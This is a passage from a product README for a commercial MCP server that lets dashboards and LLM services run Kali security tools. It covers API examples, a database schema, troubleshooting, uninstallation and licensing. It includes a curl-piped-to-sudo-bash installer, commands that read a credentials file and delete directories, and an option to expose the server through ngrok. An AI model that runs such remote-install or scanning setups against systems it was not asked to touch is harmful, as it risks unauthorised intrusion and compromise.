  -d '{
    "chunks": [
      "SSH keys provide better security than passwords",
      "Use ssh-keygen -t ed25519 to generate modern keys",
      "Disable password authentication in /etc/ssh/sshd_config"
    ]
  }' \
  "http://${SERVER_IP}:5000/llm/knowledge/docs/${DOC_ID}/chunks"

# Search knowledge base
curl -H "Authorization: Bearer ${API_KEY}" \
  "http://${SERVER_IP}:5000/llm/knowledge/search?q=ssh%20keys&top_k=3"
```

#### Conversation Memory
```bash
# Append conversation turn
curl -X POST -H "Authorization: Bearer ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{
    "thread_id": "chat-session-123",
    "role": "user",
    "content": "How do I scan for SSH vulnerabilities?",
    "meta": {"ip": "192.168.1.100"}
  }' \
  "http://${SERVER_IP}:5000/memory/append"

# Retrieve conversation with context
curl -H "Authorization: Bearer ${API_KEY}" \
  "http://${SERVER_IP}:5000/memory/retrieve?thread_id=chat-session-123&q=ssh%20scanning&limit=10"

# Summarize conversation
curl -X POST -H "Authorization: Bearer ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{
    "thread_id": "chat-session-123",
    "summary": "User asked about SSH vulnerability scanning. Discussed nmap scripts and recommended security hardening."
  }' \
  "http://${SERVER_IP}:5000/memory/summarize"
```

#### Live Context
```bash
# Get dynamic server context
curl -H "Authorization: Bearer ${API_KEY}" \
  "http://${SERVER_IP}:5000/llm/context"
```

**Response Example**:
```json
{
  "server_id": "kali-lab-01",
  "uptime": "3 days, 4:11",
  "alerts": [],
  "services": [
    {"name": "ssh", "state": "active"},
    {"name": "postgres", "state": "inactive"}
  ],
  "disk_usage": "75.5% (100 GB free)",
  "last_scan": "2025-10-05T10:30:00Z"
}
```

### JWT Authentication for Dashboards

```bash
# Get JWT token using API key
JWT_TOKEN=$(curl -X POST -H "Content-Type: application/json" \
  -d '{"api_key": "'${API_KEY}'"}' \
  "http://${SERVER_IP}:5000/auth/token" | jq -r '.access_token')

# Use JWT token for subsequent requests
curl -H "Authorization: Bearer ${JWT_TOKEN}" \
  "http://${SERVER_IP}:5000/llm/config"
```

### Integration with AI Services

The LLM configuration system is designed to support dashboard applications and AI services by providing:

1. **Authoritative Configuration**: Server stores the definitive system prompt and guardrails
2. **Contextual Knowledge**: Searchable knowledge base with BM25 full-text search
3. **Conversation Continuity**: Thread-based memory with semantic search
4. **Dynamic Context**: Live server status for context-aware responses
5. **Security Controls**: JWT authentication and optimistic concurrency control

### Database Schema

The system uses SQLite with FTS5 for efficient text search:

```sql
-- LLM Configuration
CREATE TABLE llm_config (
    server_id TEXT PRIMARY KEY,
    system_prompt TEXT NOT NULL,
    guardrails TEXT NOT NULL,     -- JSON
    runtime_hints TEXT NOT NULL, -- JSON  
    tools_allowed TEXT NOT NULL, -- JSON array
    etag TEXT NOT NULL
);

-- Knowledge Documents & Chunks with FTS5 search
CREATE TABLE knowledge_docs (
    doc_id TEXT PRIMARY KEY,
    server_id TEXT NOT NULL,
    title TEXT NOT NULL,
    source TEXT,
    tags TEXT -- JSON array
);

CREATE VIRTUAL TABLE knowledge_fts USING fts5(
    chunk_id UNINDEXED,
    doc_id UNINDEXED, 
    source UNINDEXED,
    text
);

-- Conversation Memory
CREATE TABLE conversation_memory (
    id INTEGER PRIMARY KEY,
    server_id TEXT NOT NULL,
    thread_id TEXT NOT NULL,
    role TEXT CHECK (role IN ('user', 'assistant', 'system')),
    content TEXT NOT NULL,
    meta TEXT -- JSON metadata
);
```

## DARK MATER MCP Client

This server is designed to work seamlessly with the **DARK MATER MCP Client** - a sophisticated dashboard for managing multiple MCP servers and coordinating security testing operations.

### Key Integration Features
- 🔗 **Automatic Discovery**: The client can discover and connect to MCP servers
- 🎯 **Centralized Management**: Control multiple Kali servers from one interface
- 📊 **Real-time Monitoring**: Live server status and health monitoring
- 🛠️ **Tool Orchestration**: Execute security tools across multiple servers
- 📁 **Artifact Management**: Centralized collection and analysis of results
- 🧠 **Knowledge Base**: Shared memory and findings across servers
- 🤖 **LLM Integration**: AI-powered configuration and conversation management

### Connection Setup
1. **Install and start** this MCP server using the CLI tool
2. **Enroll the server** to get your API credentials  
3. **Add server to client** using the enrollment details
4. **Start testing** with full dashboard capabilities

The DARK MATER ecosystem provides a complete security testing platform with distributed server management and comprehensive reporting capabilities.

## Security Considerations

### Network Security
- Run on isolated network segments
- Use firewall rules to restrict access
- Enable TLS for production deployments
- Consider mTLS for high-security environments

### Scope Limitations
- Configure `allowed_cidrs` to match your testing environment
- Set `allow_destructive: false` for reconnaissance-only mode
- Review scope configuration regularly

### Authentication
- Protect enrollment tokens (stored in `/etc/mcp-kali/enroll.json`)
- Rotate API keys periodically
- Monitor authentication failures in logs

### File Permissions
- Configuration files are root-only readable
- Service runs as unprivileged `mcpserver` user
- Artifacts stored with proper ownership

## Troubleshooting

### Service Won't Start

```bash
# Check service status
sudo systemctl status mcp-kali-server

# Check logs for errors
sudo journalctl -u mcp-kali-server --no-pager

# Common issues:
# - Python dependencies missing
# - Permissions on directories
# - Port already in use
```

### Authentication Failures

```bash
# Check if enrollment token exists
sudo ls -la /etc/mcp-kali/enroll.json

# Verify API credentials
sudo cat /etc/mcp-kali/credentials.json | jq

# Regenerate enrollment token
sudo rm /etc/mcp-kali/enroll.json
sudo ./install.sh  # Will generate new token
```

### Tool Execution Errors

```bash
# Check scope configuration
cat /etc/mcp-kali/scope.json

# Verify nmap is installed
which nmap

# Check tool logs
sudo journalctl -u mcp-kali-server | grep "Tool.*failed"
```

### Network Issues

```bash
# Test basic connectivity
curl -I http://SERVER_IP:5000/status

# Check if port is listening
sudo netstat -tlnp | grep :5000

# Verify firewall rules
sudo ufw status
```

## Uninstallation

```bash
# Run uninstaller
sudo ./install.sh --uninstall

# Manual cleanup if needed
sudo systemctl stop mcp-kali-server
sudo systemctl disable mcp-kali-server
sudo rm /etc/systemd/system/mcp-kali-server.service
sudo userdel mcpserver
sudo rm -rf /opt/mcp-kali-server
sudo rm -rf /var/lib/mcp

# Configuration files (remove manually if desired)
sudo rm -rf /etc/mcp-kali
```

## Development

### Manual Installation

For manual setup or customization:

```bash
# As root, create directory and set ownership
mkdir -p /opt/mcp-kali-server
chown -R mcpserver:mcpserver /opt/mcp-kali-server

# Clone repository as mcpserver user
sudo -u mcpserver git clone git@github.com:khalilpreview/MCP-Kali-Server.git /opt/mcp-kali-server

# Create virtual environment and install dependencies
sudo -u mcpserver python3 -m venv /opt/mcp-kali-server/venv
sudo -u mcpserver /opt/mcp-kali-server/venv/bin/pip install -r /opt/mcp-kali-server/requirements.txt
```

---

## 🔧 **Troubleshooting Installation**

<div align="center">
  <img src="https://img.icons8.com/color/64/000000/help.png" alt="Help" width="48"/>
  <h4>Common installation issues and solutions</h4>
</div>

### 🚨 **Common Issues**

<details>
<summary><b>🌐 Online Installer Fails</b></summary>

If `curl -sSL ... | sudo bash` fails with syntax errors:

**Solution 1: Download and inspect first**
```bash
curl -sSL https://raw.githubusercontent.com/khalilpreview/MCP-Kali-Server/main/install.sh -o install.sh
sudo chmod +x install.sh
sudo ./install.sh
```

**Solution 2: Use manual installation** (see Option 2 above)

> **✅ Recent Fix**: The "syntax error near unexpected token `else'" issue has been resolved. The installer now properly detects systemd environments and gracefully handles non-systemd systems (Docker, WSL, chroot).
</details>

<details>
<summary><b>🔑 Permission Denied on Git Clone</b></summary>

```bash
# Fix: Create directory with proper ownership first
sudo mkdir -p /opt/mcp-kali-server
sudo chown -R mcpserver:mcpserver /opt/mcp-kali-server
sudo -u mcpserver git clone https://github.com/khalilpreview/MCP-Kali-Server.git /opt/mcp-kali-server
```
</details>

<details>
<summary><b>🔧 CLI Tool Not Found</b></summary>

```bash
# Fix: Create symlink manually
sudo ln -sf /opt/mcp-kali-server/dark-mater_kali-mcp /usr/local/bin/dark-mater_kali-mcp
sudo chmod +x /usr/local/bin/dark-mater_kali-mcp
```
</details>

### Running Without Systemd

If you're running in Docker, WSL, chroot, or another environment without systemd:

```bash
# First, verify your init system (optional)
ps -p 1 -o comm=

# If you don't see "systemd", that's why systemctl fails
```

**Quickest way to run the server:**

```bash
# Start server in foreground
/opt/mcp-kali-server/venv/bin/python /opt/mcp-kali-server/kali_server.py --bind 0.0.0.0:5000

# Or run in background with nohup to keep it alive
nohup /opt/mcp-kali-server/venv/bin/python /opt/mcp-kali-server/kali_server.py --bind 0.0.0.0:5000 > /var/log/mcp-kali-server.log 2>&1 &

# With ngrok tunnel (if needed)
nohup /opt/mcp-kali-server/venv/bin/python /opt/mcp-kali-server/kali_server.py --bind 0.0.0.0:5000 --ngrok --ngrok-authtoken YOUR_TOKEN > /var/log/mcp-kali-server.log 2>&1 &
```

### Adding New Tools

1. Create schema in `mcp_server/schemas/tools/toolname.json`
2. Add tool executor to `ToolRegistry` in `mcp_server/tools.py`
3. Implement safe argument parsing and execution
4. Add scope and destructiveness checks
5. Test thoroughly in isolated environment

### API Extensions

The FastAPI app in `mcp_server/api.py` can be extended with additional endpoints. Follow the existing patterns for authentication and error handling.

---

## 📚 **Integration Documentation**

<div align="center">
  <img src="https://img.icons8.com/color/96/000000/api.png" alt="API Integration" width="64"/>
  <h4>Complete integration resources for the DARK MATER Client Dashboard</h4>
</div>

<div align="center">
  <table>
    <tr>
      <td align="center" width="33%">
        <img src="https://img.icons8.com/color/64/000000/book.png" alt="Guide" width="48"/>
        <h4>📋 Integration Guide</h4>
        <p><a href="INTEGRATION.md"><strong>INTEGRATION.md</strong></a></p>
        <p>Complete integration documentation with code examples</p>
      </td>
      <td align="center" width="33%">
        <img src="https://img.icons8.com/color/64/000000/api-settings.png" alt="API" width="48"/>
        <h4>🔌 API Reference</h4>
        <p><a href="API_REFERENCE.md"><strong>API_REFERENCE.md</strong></a></p>
        <p>Quick API endpoint reference and examples</p>
      </td>
      <td align="center" width="33%">
        <img src="https://img.icons8.com/color/64/000000/dashboard.png" alt="Dashboard" width="48"/>
        <h4>⚙️ Dashboard Config</h4>
        <p><a href="DASHBOARD_CONFIG.md"><strong>DASHBOARD_CONFIG.md</strong></a></p>
        <p>Backend setup and configuration guide</p>
      </td>
    </tr>
  </table>
</div>

### 🔑 **Key Integration Points**

<div align="center">
  <table>
    <tr>
      <td align="center" width="20%">
        <img src="https://img.icons8.com/color/48/000000/key.png" alt="Enrollment" width="32"/>
        <br><strong>Server Enrollment</strong>
        <br><small>One-time setup with enrollment token</small>
      </td>
      <td align="center" width="20%">
        <img src="https://img.icons8.com/color/48/000000/security-shield-green.png" alt="Auth" width="32"/>
        <br><strong>Bearer Authentication</strong>
        <br><small>API key-based authentication</small>
      </td>
      <td align="center" width="20%">
        <img src="https://img.icons8.com/color/48/000000/wrench.png" alt="Tools" width="32"/>
        <br><strong>Tool Execution</strong>
        <br><small>Schema-validated security tools</small>
      </td>
      <td align="center" width="20%">
        <img src="https://img.icons8.com/color/48/000000/archive.png" alt="Artifacts" width="32"/>
        <br><strong>Artifact Management</strong>
        <br><small>Automatic result storage</small>
      </td>
      <td align="center" width="20%">
        <img src="https://img.icons8.com/color/48/000000/heart-monitor.png" alt="Monitoring" width="32"/>
        <br><strong>Real-time Monitoring</strong>
        <br><small>Server health tracking</small>
      </td>
    </tr>
  </table>
</div>

---

## 📄 **License & Pricing**

<div align="center">
  <img src="https://img.shields.io/badge/License-Commercial-gold?style=for-the-badge" alt="Commercial License" />
  <img src="https://img.shields.io/badge/Access-Private-red?style=for-the-badge" alt="Private Access" />
  <br>
  <h4>🔒 Private Commercial Software</h4>
  <p>This is a <strong>private, commercial product</strong> available for purchase.</p>
  <p>Contact us for licensing and pricing information.</p>
  
  <table>
    <tr>
      <td align="center" width="33%">
        <img src="https://img.icons8.com/color/64/000000/money-bag.png" alt="Pricing" width="48"/>
        <h4>💰 Commercial License</h4>
        <p>Professional enterprise solution</p>
      </td>
      <td align="center" width="33%">
        <img src="https://img.icons8.com/color/64/000000/security-lock.png" alt="Private" width="48"/>
        <h4>🔐 Private Repository</h4>
        <p>Exclusive access for licensed users</p>
      </td>
      <td align="center" width="33%">
        <img src="https://img.icons8.com/color/64/000000/customer-support.png" alt="Support" width="48"/>
        <h4>🎯 Premium Support</h4>
        <p>Dedicated professional support</p>
      </td>
    </tr>
  </table>
</div>

---

## 🤝 **Support & Community**

<div align="center">
  <table>
    <tr>
      <td align="center" width="25%">
        <img src="https://img.icons8.com/color/64/000000/company.png" alt="Company" width="48"/>
        <h4>🏢 Zyniq Solutions</h4>
        <p><a href="https://zyniq.solutions">Visit our website</a></p>
      </td>
      <td align="center" width="25%">
        <img src="https://img.icons8.com/color/64/000000/github.png" alt="GitHub" width="48"/>
        <h4>🐛 GitHub Issues</h4>
        <p><a href="https://github.com/khalilpreview/MCP-Kali-Server/issues">Report bugs & request features</a></p>
      </td>
      <td align="center" width="25%">
        <img src="https://img.icons8.com/color/64/000000/document.png" alt="Documentation" width="48"/>
        <h4>📚 Documentation</h4>
        <p><a href="https://github.com/khalilpreview/MCP-Kali-Server/wiki">Complete documentation & guides</a></p>
      </td>
      <td align="center" width="25%">
        <img src="https://img.icons8.com/color/64/000000/api.png" alt="Integration" width="48"/>
        <h4>🔗 Integration</h4>
        <p><a href="INTEGRATION.md">Dashboard integration guide</a></p>
      </td>
    </tr>
  </table>
</div>

---

## 💼 **Purchase & Access**

<div align="center">
  <img src="https://img.icons8.com/color/64/000000/shopping-cart.png" alt="Purchase" width="48"/>
  <h4>Get Licensed Access to DARK MATER MCP Kali Server</h4>
</div>

<div align="center">
  <table>
    <tr>
      <td align="center" width="25%">
        <img src="https://img.icons8.com/color/48/000000/contact.png" alt="Contact" width="32"/>
        <br><strong>1. Contact</strong>
        <br><small>Reach out for pricing</small>
      </td>
      <td align="center" width="25%">
        <img src="https://img.icons8.com/color/48/000000/purchase-order.png" alt="License" width="32"/>
        <br><strong>2. License</strong>
        <br><small>Purchase commercial license</small>
      </td>
      <td align="center" width="25%">
        <img src="https://img.icons8.com/color/48/000000/key.png" alt="Access" width="32"/>
        <br><strong>3. Access</strong>
        <br><small>Receive private repo access</small>
      </td>
      <td align="center" width="25%">
        <img src="https://img.icons8.com/color/48/000000/rocket.png" alt="Deploy" width="32"/>
        <br><strong>4. Deploy</strong>
        <br><small>Install and configure</small>
      </td>
    </tr>
  </table>
</div>

### 🏢 **Enterprise Features**
- **� Private Repository Access** - Exclusive source code access
- **💎 Premium Support** - Direct technical support and consultation
- **🔄 Regular Updates** - Priority access to new features and security patches
- **📋 Commercial License** - Full rights for business and enterprise use
- **🎯 Custom Integration** - Tailored deployment and configuration assistance

### 📞 **Contact for Purchase**
- **Company**: [Zyniq Solutions](https://zyniq.solutions)
- **Email**: [contact@zyniq.solutions](mailto:contact@zyniq.solutions)
- **License Inquiry**: Professional and enterprise licensing available
- **Support**: Premium support included with all licenses

---

<div align="center">
  <img src="https://img.shields.io/badge/Made_with-❤️-red?style=for-the-badge" alt="Made with Love" />
  <img src="https://img.shields.io/badge/Enterprise-Ready-gold?style=for-the-badge" alt="Enterprise Ready" />
  <img src="https://img.shields.io/badge/Powered_by-Zyniq_Solutions-blue?style=for-the-badge" alt="Powered by Zyniq Solutions" />
  <br>
  <h4>💼 Professional Security Testing Platform</h4>
  <p><strong>DARK MATER MCP Kali Server</strong> - Premium security testing solution for professionals</p>
  <p><em>🔒 Private commercial software by <a href="https://zyniq.solutions"><strong>Zyniq Solutions</strong></a></em></p>
  <p><em>Contact us for licensing and access</em></p>
</div>
